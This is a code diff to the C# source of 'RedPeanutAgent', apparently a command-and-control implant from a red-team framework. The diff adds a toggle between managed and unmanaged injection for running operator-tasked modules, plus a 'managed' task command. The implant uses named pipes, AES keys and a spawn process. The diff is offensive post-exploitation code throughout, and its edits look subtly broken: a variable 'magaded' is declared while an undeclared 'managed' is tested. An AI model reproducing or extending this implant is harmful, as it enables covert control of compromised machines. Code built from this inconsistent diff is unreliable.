@@ -32,6 +32,7 @@ namespace RedPeanutAgent
         public static string namedpipe = "#PIPENAME#";
         public static string spawnp = "#SPAWN#";
         public static bool isCovered = bool.Parse("#COVERED#");
+        public static bool injectionmanaged = bool.Parse("#MANAGED#");
         public static string targetclass = "#TARGETCLASS#";
 
         public static string nutclr = "#NUTCLR#";
@@ -46,6 +47,7 @@ namespace RedPeanutAgent
             string agentid = "";
             Thread servert = null;
             bool smbstarted = false;
+            bool magaded = injectionmanaged;
 
             Dictionary<string, List<Core.Utility.TaskMsg>> commands = new Dictionary<string, List<Core.Utility.TaskMsg>>();
 
@@ -126,7 +128,15 @@ namespace RedPeanutAgent
                                     try
                                     {
                                         Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
-                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModule));
+                                        Thread commandthread;
+                                        if(managed)
+                                        {
+                                            commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleManaged));
+                                        }
+                                        else
+                                        {
+                                            commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleUnManaged));
+                                        }
                                         commandthread.Start();
                                     }
                                     catch (Exception)
@@ -154,7 +164,7 @@ namespace RedPeanutAgent
                                     try
                                     {
                                         Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
-                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteLocal));
+                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleManaged));
                                         commandthread.Start();
                                     }
                                     catch (Exception)
@@ -166,12 +176,15 @@ namespace RedPeanutAgent
                                     try
                                     {
                                         Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
-                                        commandExecuter.ExecuteLocal();
+                                        commandExecuter.ExecuteModuleManaged();
                                     }
                                     catch (Exception)
                                     {
 
                                     }
+                                    break;
+                                case "managed":
+                                    managed = task.InjectionManagedTask.Managed;
                                     break;
                                 default:
                                     try
